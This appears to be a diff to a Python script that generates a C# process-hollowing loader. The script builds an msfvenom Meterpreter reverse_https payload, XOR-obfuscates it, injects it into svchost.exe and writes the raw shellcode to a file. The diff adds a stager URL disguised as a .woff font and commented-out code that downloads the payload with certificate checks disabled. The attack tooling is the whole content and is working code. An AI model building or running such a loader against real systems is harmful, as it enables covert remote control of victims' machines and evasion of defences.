@@ -9,12 +9,14 @@ BASE_FILENAME = 'win_hollow'
 MSFVENOM_CMD = f"msfvenom -a x64 --platform Windows -p windows/x64/meterpreter/reverse_https LHOST={LHOST} LPORT={LPORT} -f raw -e generic/none"
 SVCHOST_PATH = b"C:\\\\Windows\\system32\\svchost.exe"
 XOR_KEY = b'\x09'
+STAGER_URL = "http://192.168.49.65/stager_hollow.woff"
 
 def generate(shellcode):
   svchost_path = Obfuscator(SVCHOST_PATH, XOR_KEY)
 
   template = """
 using System;
+using System.Net;
 using System.Runtime.InteropServices;
 
 namespace Hallo
@@ -103,6 +105,12 @@ static extern UInt32 ZwQueryInformationProcess( IntPtr hProcess, int procInforma
             }}
 
             byte[] buf = new byte[] {{ {xor_shellcode}  }};
+            // string url = "{stager_url}";
+
+            // ServicePointManager.ServerCertificateValidationCallback += (sender, certificate, chain, sslPolicyErrors) => true;
+            // System.Net.WebClient client = new System.Net.WebClient();
+            // byte[] buf = client.DownloadData(url);
+
             byte[] buf2 = new byte[] {{ {xor_svchost_path} }};
 
             for (int i = 0; i < buf.Length; i++)
@@ -152,7 +160,7 @@ static extern UInt32 ZwQueryInformationProcess( IntPtr hProcess, int procInforma
     }}
 }}
 
-  """.format(xor_shellcode=shellcode.get_hex_csharp(),xor_svchost_path=svchost_path.get_hex_csharp(), xor_key=shellcode.get_key_csharp())
+  """.format(xor_shellcode=shellcode.get_hex_csharp(),xor_svchost_path=svchost_path.get_hex_csharp(), xor_key=shellcode.get_key_csharp(), stager_url=STAGER_URL)
 
   print(template)
   f = open(BASE_FILENAME + '.cs', "w")
@@ -161,6 +169,10 @@ static extern UInt32 ZwQueryInformationProcess( IntPtr hProcess, int procInforma
 
   print("Wrote "+ BASE_FILENAME + '.cs')
 
+  f = open(BASE_FILENAME + '.xsc', "wb")
+  f.write(shellcode.get_bytes())
+  f.close()
+  print("Wrote shellcode to "+ BASE_FILENAME + '.xsc')
 
 def compile():
   cmd = f"mcs {BASE_FILENAME}.cs"
